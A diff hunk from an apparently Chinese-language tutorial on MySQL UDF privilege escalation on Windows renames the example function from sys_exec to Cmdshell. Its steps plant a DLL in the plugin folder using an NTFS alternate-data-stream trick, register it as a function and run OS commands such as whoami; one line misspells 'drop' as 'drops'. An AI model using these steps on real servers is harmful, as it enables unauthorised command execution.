@@ -59,22 +59,22 @@ UDF（user defined function）用户自定义函数,是MySQL的一个扩展接�
    select '这里填dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'; 利用NTFS ADS创建plugin目录
    ```
 
-7. 创建sys_exec函数
+7. 创建Cmdshell函数
 
    ```sql
-   create function sys_exec returns string soname 'udf.dll'; 
+   create function Cmdshell returns string soname 'udf.dll'; 
    ```
 
 8. 执行命令
 
    ```sql
-   select sys_exec('whoami');
+   select Cmdshell('whoami');
    ```
 
 9. 删除函数
 
    ```sql
-   drops function sys_exec; 将函数删除
+   drops function Cmdshell; 将函数删除
    ```
 
 10. 导出的SQL语句
